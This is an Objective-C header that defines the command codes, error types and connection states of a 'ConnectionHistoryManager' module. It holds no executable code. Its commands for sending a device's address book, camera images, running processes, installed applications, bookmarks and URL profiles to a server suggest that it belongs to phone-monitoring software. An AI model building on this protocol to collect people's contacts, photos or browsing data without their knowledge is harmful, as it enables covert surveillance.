//
//  DefConnectionHistory.h
//  ConnectionHistoryManager
//
//  Created by Makara Khloth on 11/28/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

typedef enum {
	kNotAvailable								= 0,
	kSendActivate								= 2,
	kSendDeactivate								= 3,
	kSendEvent									= 1,
	kSendClearCSID								= 7,
	kSendHeartBeat								= 4,
	kSendRunningProcesses						= 20,
	kSendAddressBook							= 11,
	kSendAddressBookForApproval					= 10,
	kSendCallInProgressNotification				= 24,
	kGetCSID									= 6,
	kGetTime									= 17,
	kSendMessage								= 18,
	kGetProcessProfile							= 19,
	kGetCommunicationDirectives					= 16,
	kGetConfiguration							= 5,
	kGetActivationCode							= 8,
	kGetAddressBook								= 9,
	kGetProcessBlackList						= 21,
	kGetSoftwareUpdate							= 22,
	kGetIncompatibleApplicationDefinitions		= 23,
	//kSendRAsk, // Obsolete
	kSendInstalledApplication					= 25,
	kSendCameraImage							= 26,
	kSendRunningApplication						= 27,
	kSendApplicationProfile						= 28,
	kSendBookmark								= 29,
	kSendUrlProfile								= 30,
	kGetApplicationProfile						= 31,
	kGetUrlProfile								= 32,
	kGetActivationCodeForAccount				= 33,
	
	// Not phoenix commands but direct http request (POST, GET,...)
	kSignUpForActivationCode					= 101
} ConnectionHistoryCommandCode;

typedef enum {
	kCommandActionSignUpForActivationCode,
} kConnectionHistoryCommandAction;

typedef enum {
	kErrorTypeNone,
	kErrorTypeHttp,
	kErrorTypeServer,
	kErrorTypeApplication
} ConnectionHistoryErrorType;

typedef enum {
	kConnectionTypeWifi,
	kConnectionTypeGprs
} ConnectionHistoryConnectionType;

typedef enum {
	kConnectionStatusSuccess,
	kConnectionStatusFailed
} ConnectionHistoryConnectionStatus;
